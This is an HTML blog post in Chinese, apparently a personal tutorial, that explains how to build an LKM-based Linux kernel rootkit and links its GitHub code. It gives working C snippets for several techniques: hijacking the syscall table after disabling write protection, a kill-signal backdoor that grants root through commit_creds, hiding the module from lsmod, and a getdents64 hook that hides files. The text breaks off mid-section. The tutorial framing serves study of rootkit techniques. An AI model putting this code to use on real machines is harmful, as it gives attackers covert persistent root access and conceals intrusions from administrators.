@@ -1,0 +1,994 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="GitHub链接 演示Slides overviewrootkit是一种恶意软件，攻击者可以在获得 root 或管理员权限后安装它，从而隐藏入侵并保持root权限访问。rootkit可以是用户级的，也可以是内核级的。关于rootkit的详细介绍可以参考https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;rootkit 有许多技术可以实现rootkit，本项目使用的是通过编写LKM（Linu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个基于 LKM 的 Linux 内核级 rootkit 的实现">
+<meta property="og:url" content="http://gls.show/p/cd0d68e2/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="GitHub链接 演示Slides overviewrootkit是一种恶意软件，攻击者可以在获得 root 或管理员权限后安装它，从而隐藏入侵并保持root权限访问。rootkit可以是用户级的，也可以是内核级的。关于rootkit的详细介绍可以参考https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;rootkit 有许多技术可以实现rootkit，本项目使用的是通过编写LKM（Linu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/rootkit.png">
+<meta property="article:published_time" content="2022-10-29T16:53:28.618Z">
+<meta property="article:modified_time" content="2023-03-21T14:28:17.819Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/rootkit.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>一个基于 LKM 的 Linux 内核级 rootkit 的实现 - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一个基于 LKM 的 Linux 内核级 rootkit 的实现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-30 00:53" pubdate>
+          2022年10月30日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一个基于 LKM 的 Linux 内核级 rootkit 的实现</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年3月21日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <p><a target="_blank" rel="noopener" href="https://github.com/LaPhilosophie/hello-rootkit">GitHub链接</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LaPhilosophie/hello-rootkit/blob/main/PPT.pdf">演示Slides</a></p>
+<h1 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h1><p>rootkit是一种恶意软件，攻击者可以在获得 root 或管理员权限后安装它，从而<strong>隐藏入侵并保持root权限访问</strong>。rootkit可以是用户级的，也可以是内核级的。关于rootkit的详细介绍可以参考<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/rootkit">https://en.wikipedia.org/wiki/rootkit</a></p>
+<p>有许多技术可以实现rootkit，本项目使用的是通过编写LKM（Linux kernel module）并hook系统调用表的方式。这种方式具有诸多优点，比如rootkit作为内核模块可以动态的加载和卸载，大多数rootkit也都是通过LKM的方式实现的</p>
+<h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>一个简单的LKM示例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// header file</span><br><br><span class="hljs-comment">// module info</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">example_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	printk(KERN_INFO <span class="hljs-string">&quot;Hello, World!\n&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">example_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	printk(KERN_INFO <span class="hljs-string">&quot;Goodbye, World!\n&quot;</span>);<br>&#125;<br><br>module_init(example_init);<br>module_exit(example_exit);<br></code></pre></td></tr></table></figure>
+
+<p>在完成了对应Makefile的编写之后，使用<code>make</code>命令可以编译出ko文件（kernel object），使用<code>insmod rootkit.ko</code>命令可以安装内核模块，使用<code>rmmod rootkit</code>可以卸载rootkit模块，使用<code>dmesg</code>命令可以打印程序中printk的信息</p>
+<h1 id="hook系统调用"><a href="#hook系统调用" class="headerlink" title="hook系统调用"></a>hook系统调用</h1><p>用户进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用<code>man -k syscall</code>获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能</p>
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/hook.png" srcset="/img/loading.gif" lazyload alt="hook"></p>
+<p>比如，当用户使用ls命令列出该目录下所有文件的时候，本质上是使用了<code>getdents64</code>系统调用，如果我们将<code>getdents64</code>的<strong>地址替换</strong>为我们自己构造的函数<code>hook_getdents64</code> ，即可劫持系统调用流程。因此，只要我们分析清楚了某一个shell命令底层所执行的系统调用，并成功对其进行hook，那么就可以成功实现rootkit的种种目的</p>
+<p><code>strace </code> 命令可以对系统调用进行跟踪，这可以帮助我们分析命令的函数调用链</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> strace -c ls</span><br><span class="hljs-meta">%</span><span class="bash"> time     seconds  usecs/call     calls    errors syscall</span><br>------ ----------- ----------- --------- --------- ----------------<br>  0.00    0.000000           0         8           read<br>  0.00    0.000000           0         1           write<br>  0.00    0.000000           0        13           close<br>  0.00    0.000000           0        12           fstat<br>  0.00    0.000000           0        32           mmap<br>  0.00    0.000000           0         9           mprotect<br>  0.00    0.000000           0         2           munmap<br>  0.00    0.000000           0         3           brk<br>  0.00    0.000000           0         2           rt_sigaction<br>  0.00    0.000000           0         1           rt_sigprocmask<br>  0.00    0.000000           0         2           ioctl<br>  0.00    0.000000           0         8           pread64<br>  0.00    0.000000           0         2         1 access<br>  0.00    0.000000           0         1           execve<br>  0.00    0.000000           0         1           readlink<br>  0.00    0.000000           0         2         2 statfs<br>  0.00    0.000000           0         2         1 arch_prctl<br>  0.00    0.000000           0         2           getdents64<br>  0.00    0.000000           0         1           set_tid_address<br>  0.00    0.000000           0        11           openat<br>  0.00    0.000000           0         1           set_robust_list<br>  0.00    0.000000           0         1           prlimit64<br>------ ----------- ----------- --------- --------- ----------------<br>100.00    0.000000                   117         4 total<br></code></pre></td></tr></table></figure>
+
+<p>回到hook系统调用这个事情上来，内核中有一张<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">系统调用表</a>，存放了所有的系统调用的地址，我们需要找到这张表的地址，才能对系统调用“偷梁换柱”——将原本的syscall的地址替换为我们自己实现的syscall地址。也可以将系统调用表看做是一个数组，系统调用号为其索引，不同的系统调用号对应着不同的系统调用。需要小心的是，相同的系统调用函数，对于不同的架构，调用号是不同的。<a target="_blank" rel="noopener" href="https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html">这个页面</a>列出了 Linux 支持的架构的所有系统调用</p>
+<p>查找系统调用表的地址有很多方法，比如：</p>
+<ul>
+<li>使用kallsyms</li>
+<li>使用ftrace</li>
+<li>暴力枚举</li>
+</ul>
+<p>注意，由于rootkit与系统内核版本是强相关的，所以对于不同的内核，查找系统调用表的方式也不同，比如有的版本的内核无法使用kallsyms得到系统调用表地址，那么就可以考虑使用ftrace</p>
+<p>使用kallsyms：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//函数声明，real_sys_openat是真实的sys_openat函数</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*real_sys_openat)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//函数声明,hook_sys_openat我们自己实现的sys_openat函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//获取系统调用表地址</span><br>real_sys_call_table = (<span class="hljs-keyword">void</span> *)kallsyms_lookup_name(<span class="hljs-string">&quot;sys_call_table&quot;</span>);<br><br><span class="hljs-comment">//保存原来的kill函数的地址，最后需要恢复原状</span><br>real_sys_openat = (<span class="hljs-keyword">void</span> *)real_sys_call_table[__NR_openat];<br><br><span class="hljs-comment">// 关闭写保护</span><br>disable_wp();<br><br><span class="hljs-comment">//将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱</span><br>real_sys_call_table[__NR_openat] = (<span class="hljs-keyword">void</span> *)my_sys_openat;<br><br><span class="hljs-comment">// 恢复现场，打开写保护</span><br>enable_wp();<br></code></pre></td></tr></table></figure>
+
+<p>使用ftrace：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在头文件中写上hook数组</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ftrace_hook</span> <span class="hljs-title">hooks</span>[] =</span> &#123;<br>    HOOK(<span class="hljs-string">&quot;__x64_sys_mkdir&quot;</span>, hook_mkdir, &amp;orig_mkdir),<br>    HOOK(<span class="hljs-string">&quot;__x64_sys_getdents&quot;</span>, hook_getdents, &amp;orig_getdents)&#125;;<br>    <br><span class="hljs-comment">//在模块初始化时执行hook安装</span><br>fh_install_hooks(hooks, ARRAY_SIZE(hooks));<br><br><span class="hljs-comment">//在模块卸载化时执行hook卸载</span><br>fh_remove_hooks(hooks, ARRAY_SIZE(hooks));<br></code></pre></td></tr></table></figure>
+
+<p>在某些内核版本中，<code>/proc/kallsyms</code>文件存储了系统调用吧和系统调用的地址信息，我们可以使用命令行获取：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /proc/kallsyms | grep xxx<br></code></pre></td></tr></table></figure>
+
+
+
+<p>同样的，对于不同的内核，系统调用函数的声明不同，这是一个对比：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 旧</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd, struct linux_dirent *dirp,</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br><br><span class="hljs-comment">// 新</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">sys_getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd,</span></span><br><span class="hljs-params"><span class="hljs-function">				struct linux_dirent __user *dirent,</span></span><br><span class="hljs-params"><span class="hljs-function">				<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p><code>asmlinkage</code>是一个宏，告诉编译器在 CPU 堆栈上查找函数参数，而不是寄存器。众所周知，用户态程序调用syscall的时候，会下陷到内核态，此时会保存 CPU 堆栈中的所有寄存器（eax、ebx、ecx 等）。因此，从用户空间传递到内核空间的有关参数的信息都被保存在堆栈中，这也即是使用<code>asmlinkage</code>的原因</p>
+<p>对于新的系统调用，存储在寄存器中的参数会先被复制到<code>pt_regs</code>结构体中，因此当我们编写hook函数的时候，需要先从这个结构体中获取对应的参数值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//函数声明,hook_sys_openat我们自己实现的sys_openat函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p>此外由于内核空间和用户空间是隔离的，地址的映射并不互通，因此需要使用<code>copy_to_user</code>和<code>copy_from_user</code>进行数据的传输</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
+<li><p><code>cred</code>是一个记录进程credentials信息的结构体，具体定义在<code>cred.c</code>头文件中</p>
+</li>
+<li><p><code>prepare_creds()</code>返回当前进程的<code>cred</code>结构</p>
+</li>
+<li><p><code>commit_creds()</code>将这个cred应用于当前进程，因此我们只需要对cred结构体进行修改即可实现提权</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">newcreds</span>;</span><br>    newcreds = prepare_creds();<br>    <span class="hljs-keyword">if</span> (newcreds == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    newcreds-&gt;uid.val = newcreds-&gt;gid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;euid.val = newcreds-&gt;egid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;suid.val = newcreds-&gt;sgid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;fsuid.val = newcreds-&gt;fsgid.val = <span class="hljs-number">0</span>;<br>    commit_creds(newcreds);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>hook kill实现提权，当我们在shell中输入kill -64 &lt;num&gt;的时候会将shell提权到root，可以使用id命令验证这一点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_kill</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = regs-&gt;di;<br>    <span class="hljs-keyword">int</span> sig = regs-&gt;si;<br>    <span class="hljs-keyword">if</span> (sig == <span class="hljs-number">64</span>)<br>    &#123;<br>        printk(KERN_INFO <span class="hljs-string">&quot; get_root &quot;</span>);<br>        get_root();<br>    &#125;<br>    <span class="hljs-keyword">return</span> orig_kill(regs);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h1><p>lsmod命令可以列出已安装的内核模块，rmmod可以删除。模块隐藏也即是让lsmod命令无法输出我们的模块</p>
+<p>内核使用module结构体存储模块信息，可以看到module封装了list双向链表，下面的源码可以在<code>module.h</code>中找到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">module_state</span> <span class="hljs-title">state</span>;</span><br><br>	<span class="hljs-comment">/* Member of list of modules */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br>	<span class="hljs-comment">// ... and so on </span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>为了隐藏模块，我们只需把对应rootkit模块的list从全局链表中删除即可。内核已经替我们实现了list_del和list_add函数，它们被封装在list.h头文件中，我们调用即可。在下面的代码中，THIS_MODULE宏指向当前模块的module struct</p>
+<p>值得注意的是，为了恢复节点，我们需要临时保存节点的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hide_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_del(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>);  &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_add(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>, module_prev); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">module_info</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;   module_prev = THIS_MODULE-&gt;<span class="hljs-built_in">list</span>.prev;  &#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h1><p>ls命令可以打印出文件，为了深入研究ls做了什么，可以使用strace命令进行追踪。strace具有许多有趣的选项，比如<code>-c</code>可以打印出统计表格， <code>-p</code>可以追踪某一进程，等等 </p>
+<p>一通分析后可以发现ls命令调用了<code>getdents64 syscall</code>（实际上有些较新的内核版本仍然会调用<code>getdents</code>函数而不是较新的<code>getdents64</code>，这个后面还会提到），该函数可以得到目录的entry，并返回读取的字节数。我们可以通过对该函数进行hook从而达到隐藏文件的目的</p>
+<p>下面是hook_getdents64函数的设计，省略了一些报错处理和别的细节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 声明原本的getdents64函数</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*orig_getdents64)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// 声明我们设计的hook_getdents64函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// ssize_t getdents64(int fd, void *dirp, size_t count);</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">int</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//获取寄存器中的内容</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> __<span class="hljs-title">user</span> *<span class="hljs-title">dirent</span> =</span> (struct linux_dirent64 *)regs-&gt;si;<br>	<span class="hljs-comment">//遍历，对希望隐藏的文件进行处理</span><br>	<span class="hljs-keyword">while</span> (tlen &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        len = current_dir-&gt;d_reclen;<br>        tlen = tlen - len;<br>        <span class="hljs-keyword">if</span> (check_file(current_dir-&gt;d_name))<span class="hljs-comment">//覆盖操作</span><br>        &#123;<br>            ret = ret - len;<br>            memmove(current_dir, (<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen, tlen);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            current_dir = (struct linux_dirent64 *)((<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen);<br>    &#125;<br>	<span class="hljs-comment">//返回正常调用的结果</span><br>	<span class="hljs-keyword">return</span> orig_getdents64(regs);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>为了设计出上面的代码我们需要详细理解linux_dirent结构体和linux_dirent64结构体，它们分别对应getdents函数和getdents64函数，后者是为了处理更大的文件系统和偏移而设计的，细节如下：</p>
